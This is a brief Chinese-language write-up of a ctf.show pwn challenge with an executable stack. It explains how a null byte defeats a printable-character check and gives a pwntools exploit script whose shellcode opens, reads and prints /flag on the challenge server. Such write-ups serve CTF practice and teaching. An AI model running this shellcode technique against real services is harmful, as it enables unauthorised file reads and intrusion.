# 挑战简介
可以开始你的个人秀了 flag文件位置为/flag

# 思路
这一题的思路比上一题还简单些，毕竟栈可执行  

对于检查的逻辑也很简单  
```
signed __int64 __fastcall is_printable(const char *a1)
{
  int i; // [rsp+1Ch] [rbp-14h]

  for ( i = 0; i < strlen(a1); ++i )
  {
    if ( a1[i] <= 31 || a1[i] == 127 )
      return 0LL;
  }
  return 1LL;
}
```
只要你推进去一个0，就可以跳过这个函数  

```
from pwn import *
from LibcSearcher import *
#context.log_level = 'debug'
context(os='linux', arch='amd64', log_level='debug')
p=remote("pwn.challenge.ctf.show",28227)

mmap=0x000000000602068
jmp_rsp=0x0000000000400a01
p.recvuntil("name:\n")

shellcode="push 0;push 0x67616c66;mov rax,2;mov rdi,rsp;xor rsi,rsi;xor rdx,rdx;syscall;" 
shellcode+="mov rax,0;mov rdi ,0x3;mov rsi,rsp;mov rdx,0x100;syscall;"
shellcode+="mov rax,1;mov rdi ,0x1;mov rsi,rsp;mov rdx,0x100;syscall" 

p.sendline(asm(shellcode))
p.interactive()
```
